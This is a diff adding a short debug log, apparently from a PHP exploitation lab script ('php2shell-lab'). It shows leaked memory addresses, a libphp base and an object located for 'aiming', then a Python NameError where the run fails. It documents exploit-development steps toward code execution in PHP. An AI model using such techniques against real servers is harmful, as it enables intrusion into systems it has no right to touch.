@@ -1,0 +1,12 @@
+=== oom98: self-scan aiming ===
+    probe basic:  R=7f559d1f6000 d=710f8 124110 | pid=17
+
+    libphp=0x7f559ee98000
+    warm-up sent
+    sentinel at R=0x7f559ca00000 V=0x7f559ca01720 (pid R=7f559ca00000 d=1718 1720 1728 1730 1738 1740 1748 1750 1758 1760 1768 1770 | R=7f559cc00000 d=1718 1720 1728 1730 1738 1740 1748 1750 1758 1760 1768 1770 | R=7f559d1f6000 d=6762d 67635 6763d 67645)
+    OBJ=0x7f559ca01908 (value-off 488, nib=8 refc=1)
+Traceback (most recent call last):
+  File "/Users/vlad/Projects/queue/php2shell-lab/oom98.py", line 172, in <module>
+    m = _re.search(re.escape(struct.pack("<Q", OBJ) * 8), aim_body)
+                   ^^
+NameError: name 're' is not defined. Did you mean: '_re'? Or did you forget to import 're'?
